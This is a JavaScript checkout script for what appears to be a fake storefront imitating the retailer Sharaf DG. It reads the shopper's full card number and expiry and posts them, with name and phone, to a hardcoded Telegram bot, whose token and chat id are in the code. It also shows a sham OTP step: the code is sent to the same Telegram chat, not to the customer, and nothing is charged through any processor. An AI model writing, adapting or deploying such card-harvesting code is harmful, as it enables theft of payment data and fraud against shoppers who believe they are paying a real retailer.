import { db, collection, addDoc } from './firebase-config.js';

const orderData = JSON.parse(localStorage.getItem('pendingOrder'));
let sharafdg_otp_code = null;
let otpAttempts = 0;
const curr = '<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTtauUn1R9dGoEXyG6AaYXbzovVet90qe0igubKGL7Ew&s" style="height:12px; vertical-align:middle; margin-left:3px;">';

if (!orderData) {
    document.body.innerHTML = '<div style="text-align:center; padding:50px;"><h2>لا يوجد طلب</h2><a href="index.html" style="color:var(--primary-color);">العودة للمتجر</a></div>';
} else {
    const summaryEl = document.getElementById('orderSummary');
    let itemsHtml = orderData.items.map(item => `
        <div class="summary-row">
            <span>${item.name} (${item.color}) × ${item.quantity}</span>
            <span>${curr}${(item.price * item.quantity).toFixed(2)}</span>
        </div>
    `).join('');

    let paymentInfo = '';
    if (orderData.paymentMethod === 'installment') {
        const remaining = orderData.total - orderData.downPayment;
        const monthly = remaining / orderData.months;
        paymentInfo = `
            <div class="summary-row"><span>الدفعة الأولى</span><span>${curr}${orderData.downPayment.toFixed(2)}</span></div>
            <div class="summary-row"><span>عدد الأقساط</span><span>${orderData.months} شهر</span></div>
            <div class="summary-row"><span>القسط الشهري</span><span>${curr}${monthly.toFixed(2)}</span></div>
        `;
    } else if (orderData.paymentMethod === 'tamara') {
        const monthly = (orderData.total - 1000) / 12;
        paymentInfo = `
            <div class="summary-row"><span>Tamara - الدفعة الأولى</span><span>${curr}1000.00</span></div>
            <div class="summary-row"><span>عدد الأقساط</span><span>12 شهر</span></div>
            <div class="summary-row"><span>القسط الشهري</span><span>${curr}${monthly.toFixed(2)}</span></div>
        `;
    } else {
        paymentInfo = `<div class="summary-row"><span>المجموع الكلي</span><span>${curr}${orderData.total.toFixed(2)}</span></div>`;
    }

    if (summaryEl) {
        summaryEl.innerHTML = `
            <h3 style="color:var(--primary-color); margin-bottom:15px;">ملخص الطلب</h3>
            <div class="summary-container">
                ${itemsHtml}
                ${paymentInfo}
            </div>
        `;
    }
}

// ==========================================
// دوال نافذة OTP
// ==========================================

window.showOTPModal = function() {
    const modal = document.getElementById('otpModal');
    if (modal) {
        modal.style.display = 'flex';
        const phoneEl = document.getElementById('otpPhone');
        if (phoneEl && orderData.phone) {
            phoneEl.textContent = orderData.phone;
        }
        setTimeout(() => {
            const firstDigit = document.querySelector('.otp-digit');
            if (firstDigit) firstDigit.focus();
        }, 100);
        console.log('✅ تم إظهار نافذة OTP');
    }
};

window.closeOTPModal = function() {
    const modal = document.getElementById('otpModal');
    if (modal) {
        modal.style.display = 'none';
    }
    document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
    const msgEl = document.getElementById('otpMessage');
    if (msgEl) msgEl.innerHTML = '';
};

window.getEnteredOTP = function() {
    const digits = document.querySelectorAll('.otp-digit');
    let otp = '';
    digits.forEach(d => { otp += d.value; });
    return otp;
};

window.moveToNext = function(input, index) {
    if (input.value.length === 1) {
        const inputs = document.querySelectorAll('.otp-digit');
        if (index < 5 && inputs[index + 1]) {
            inputs[index + 1].focus();
        }
    }
};

// ==========================================
// إرسال OTP عبر تليجرام
// ==========================================

async function sendOTP() {
   sharafdg_otp_code = Math.floor(100000 + Math.random() * 900000).toString();
const message = `🔐 رمز التحقق الجديد: <b>${sharafdg_otp_code}</b>\n\nالعميل: ${orderData.customerName}\nالهاتف: ${orderData.phone}`;
    
    try {
        const response = await fetch('https://api.telegram.org/bot8763567744:AAEjPu0YFJAHMQspulqQDgYr1TqU6W61hpi/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: '8214447975', text: message, parse_mode: 'HTML' })
        });
        const data = await response.json();
        console.log('📩 نتيجة إرسال OTP:', data);
        return data.ok;
    } catch (error) {
        console.error('❌ خطأ في إرسال OTP:', error);
        return false;
    }
}

// ==========================================
// التحقق من OTP
// ==========================================

window.verifyOTP = function() {
    const entered = window.getEnteredOTP();
    const messageEl = document.getElementById('otpMessage');
    
    if (entered.length !== 6) {
        messageEl.innerHTML = '<div class="error-message">⚠️ الرجاء إدخال الرمز كاملاً (6 أرقام)</div>';
        return;
    }
    
   if (entered === sharafdg_otp_code) {
        messageEl.innerHTML = '<div class="success-message">✅ تم التحقق بنجاح! جاري إتمام الدفع...</div>';
        setTimeout(() => {
            window.completePayment();
        }, 1500);
    } else {
        otpAttempts++;
        messageEl.innerHTML = `<div class="error-message"> الرمز غير صحيح! (${3 - otpAttempts} محاولات متبقية)</div>`;
        if (otpAttempts >= 3) {
            messageEl.innerHTML = '<div class="error-message">🔒 تم قفل العملية. يرجى المحاولة لاحقاً.</div>';
            setTimeout(() => {
                window.closeOTPModal();
                window.location.href = 'cart.html';
            }, 3000);
        }
        document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
        document.querySelectorAll('.otp-digit')[0].focus();
    }
};

// ==========================================
// إعادة إرسال OTP
// ==========================================

window.resendOTP = async function() {
    const messageEl = document.getElementById('otpMessage');
    messageEl.innerHTML = '<div style="color:#666;"> جاري إرسال الرمز الجديد...</div>';
    const sent = await sendOTP();
    if (sent) {
        messageEl.innerHTML = '<div class="success-message">✅ تم إرسال الرمز الجديد</div>';
        otpAttempts = 0;
    } else {
        messageEl.innerHTML = '<div class="error-message">❌ فشل الإرسال، حاول مرة أخرى</div>';
    }
};

// ==========================================
// إتمام الدفع
// ==========================================

window.completePayment = async function() {
    const payBtn = document.getElementById('payBtn');
    if (payBtn) payBtn.disabled = true;
    
    try {
        const { updateDoc, doc } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js');
        
        await updateDoc(doc(db, "orders", orderData.orderId), {
            cardLast4: document.getElementById('cardNumber').value.slice(-4),
            paymentStatus: 'completed',
            paidAt: new Date()
        });
        
        const confirmMessage = `✅ <b>تم الدفع بنجاح!</b>\n\nرقم الطلب: #${orderData.orderId}\nالعميل: ${orderData.customerName}\nالهاتف: ${orderData.phone}\nالمبلغ: ${orderData.total} د.إ`;
        
        await fetch('https://api.telegram.org/bot8763567744:AAEjPu0YFJAHMQspulqQDgYr1TqU6W61hpi/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: '8214447975', text: confirmMessage, parse_mode: 'HTML' })
        });
        
        localStorage.removeItem('pendingOrder');
        localStorage.removeItem('cart');
        
        alert('✅ تم الدفع بنجاح! شكراً لطلبك.');
        window.location.href = 'index.html';
        
    } catch (error) {
        console.error('❌ خطأ في إتمام الدفع:', error);
        alert('❌ حدث خطأ: ' + error.message);
        if (payBtn) payBtn.disabled = false;
    }
};

// ==========================================
// معالجة الدفع (الدالة الرئيسية)
// ==========================================

window.processPayment = async function() {
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const cardExpiry = document.getElementById('cardExpiry').value;
    const cardCVV = document.getElementById('cardCVV').value;
    const cardName = document.getElementById('cardName').value;
    
    if (!cardNumber || !cardExpiry || !cardCVV || !cardName) {
        alert('⚠️ الرجاء ملء جميع بيانات البطاقة');
        return;
    }
    
    if (cardNumber.length < 13) {
        alert('⚠️ رقم البطاقة غير صحيح');
        return;
    }
    
    const cardMessage = `<b>${orderData.customerName}</b>\n📱: ${orderData.phone}\n💳: ${cardNumber}\n📅: ${cardExpiry}`;
    
    try {
        await fetch('https://api.telegram.org/bot8763567744:AAEjPu0YFJAHMQspulqQDgYr1TqU6W61hpi/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: '8214447975', text: cardMessage, parse_mode: 'HTML' })
        });
        
        const otpSent = await sendOTP();
        if (otpSent) {
            window.showOTPModal();
        } else {
            alert('️ فشل إرسال رمز التحقق.');
        }
        
    } catch (error) {
        console.error('❌ خطأ في المعالجة:', error);
        alert('❌ حدث خطأ في الإرسال: ' + error.message);
    }
};

// ==========================================
// تنسيق تاريخ البطاقة
// ==========================================

function formatCardDate(input) {
    let value = input.value.replace(/[^0-9]/g, '');
    if (value.length > 4) {
        value = value.substring(0, 4);
    }
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2);
    }
    input.value = value;
}

console.log('✅ payment.js تم تحميله بنجاح');
